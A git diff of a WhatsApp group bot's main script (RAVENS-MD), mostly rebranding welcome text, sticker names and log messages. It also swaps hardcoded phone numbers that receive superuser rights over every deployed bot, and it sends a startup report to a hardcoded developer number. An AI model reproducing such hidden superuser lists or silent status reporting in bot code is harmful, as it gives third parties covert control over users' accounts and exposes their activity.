@@ -154,10 +154,10 @@ setTimeout(() => {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dj = '263780934873';
+            const dj = '263780958186';
             const dj2 = '263780934873';
-            const dj3 = "263780934873";
-            const luffy = '263780934873';
+            const dj3 = "263714757857";
+            const luffy = '263780166288';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -442,7 +442,7 @@ function mybotpic() {
 
                                       if (action === 'remove') {
 
-                                        txt += `message deleted \n @${auteurMessage.split("@")[0]} removed from group by RAVENS-MD .`;
+                                        txt += `message deleted \n @${auteurMessage.split("@")[0]} removed from group by RAVENS-MD.`;
 
                                     await zk.sendMessage(origineMessage, { sticker: fs.readFileSync("st1.webp") });
                                     (0, baileys_1.delay)(800);
@@ -526,7 +526,7 @@ function mybotpic() {
            // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
             const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
             var sticker = new Sticker(gifLink, {
-                pack: 'Beltah-Md',
+                pack: 'Ravens-Md',
                 author: conf.OWNER_NAME,
                 type: StickerTypes.FULL,
                 categories: ['🤩', '🎉'],
@@ -663,7 +663,7 @@ zk.ev.on('group-participants.update', async (group) => {
     try {
         ppgroup = await zk.profilePictureUrl(group.id, 'image');
     } catch {
-        ppgroup = 'https://telegra.ph/file/a0fe1c1c4b5cb2de79150.jpg';
+        ppgroup = 'https://telegra.ph/file/1c0896918ea17651fef35.jpg';
     }
 
     try {
@@ -671,8 +671,8 @@ zk.ev.on('group-participants.update', async (group) => {
 
         if (group.action == 'add' && (await recupevents(group.id, "welcome") == 'on')) {
             let msg = `╔════◇◇◇═════╗
-║ welcome to new(s) member(s)
-║ *New(s) Member(s) :*
+║ welcome to our channel new(s) member(s)
+║ read the grup descriptionto avoid being removed:*
 `;
 
             let membres = group.participants;
@@ -684,7 +684,7 @@ zk.ev.on('group-participants.update', async (group) => {
 ╚════◇◇◇═════╝
 ◇ *Descriptioon*   ◇
 
-${metadata.desc}\n\n> POWERED BY MALVIN TECH.`;
+${metadata.desc}\n\n> POWERED BY RAVENS TECH.`;
 
             zk.sendMessage(group.id, { image: { url: ppgroup }, caption: msg, mentions: membres });
         } else if (group.action == 'remove' && (await recupevents(group.id, "goodbye") == 'on')) {
@@ -821,14 +821,14 @@ ${metadata.desc}\n\n> POWERED BY MALVIN TECH.`;
                 console.log("------");
                 await (0, baileys_1.delay)(300);
                 console.log("------------------/-----");
-                console.log("RAVENS-MD by MALVIN TECH installing cmds😇\n\n");
+                console.log("RAVENS-MD by Malvin King installing cmds😇\n\n");
                 //chargement des commandes 
                 console.log("chargement des commandes ...\n");
                 fs.readdirSync(__dirname + "/commandes").forEach((fichier) => {
                     if (path.extname(fichier).toLowerCase() == (".js")) {
                         try {
                             require(__dirname + "/commandes/" + fichier);
-                            console.log(fichier + "Successfully installed RAVENS-MD md commands✔️");
+                            console.log(fichier + "Successfully installed RAVENS MD commands✔️");
                         }
                         catch (e) {
                             console.log(`${fichier} n'a pas pu être chargé pour les raisons suivantes : ${e}`);
@@ -858,37 +858,37 @@ ${metadata.desc}\n\n> POWERED BY MALVIN TECH.`;
     Prefix : [ ${prefixe} ]
     Mode :${md} mode
     Total Command : ${evt.cm.length}
-    Owner : MALVIN KING 🦸  
+    Owner : Malvin King 🤴 
 
 > THANK YOU FOR CHOOSING RAVENS-MD.\n`;
-                await zk.sendMessage("263780934873@s.whatsapp.net", { text: cmsg });
+                await zk.sendMessage("263780166288@s.whatsapp.net", { text: cmsg });
                 }
             }
             else if (connection == "close") {
                 let raisonDeconnexion = new boom_1.Boom(lastDisconnect?.error)?.output.statusCode;
                 if (raisonDeconnexion === baileys_1.DisconnectReason.badSession) {
-                    console.log('Invalid Session ID please get an new one ASAP....');
+                    console.log('Invalid Session ID please get an new one ASAP.....');
                 }
                 else if (raisonDeconnexion === baileys_1.DisconnectReason.connectionClosed) {
                     console.log('!!!! connection closed reconection in progress....');
                     main();
                 }
                 else if (raisonDeconnexion === baileys_1.DisconnectReason.connectionLost) {
-                    console.log('connection to server lost 😞 ,,ravens trying to reconnect... ');
+                    console.log('connection error😞 ,,ravens trying to reconnect... ');
                     main();
                 }
                 else if (raisonDeconnexion === baileys_1.DisconnectReason?.connectionReplaced) {
                     console.log('connection replaced but session alread open please close it ASAP !!!');
                 }
                 else if (raisonDeconnexion === baileys_1.DisconnectReason.loggedOut) {
-                    console.log('youve been disconnected please get a new session id ASAP"');
+                    console.log('youve been disconnected please get a new session id ASAP ');
                 }
                 else if (raisonDeconnexion === baileys_1.DisconnectReason.restartRequired) {
-                    console.log('Reboot in progress ▶️');
+                    console.log('reconnecting an error cours ▶️');
                     main();
                 }   else {
 
-                    console.log('Restarting immediatly after an l\'error  ',raisonDeconnexion) ;         
+                    console.log('Restarting immediatly after an l\'error ',raisonDeconnexion) ;         
                     //repondre("* Redémarrage du bot en cour ...*");
 
                                 const {exec}=require("child_process") ;
@@ -977,7 +977,7 @@ ${metadata.desc}\n\n> POWERED BY MALVIN TECH.`;
     let fichier = require.resolve(__filename);
     fs.watchFile(fichier, () => {
         fs.unwatchFile(fichier);
-        console.log(`Caught exception: ${__filename}`);
+        console.log(`mise à jour ${__filename}`);
         delete require.cache[fichier];
         require(fichier);
     });
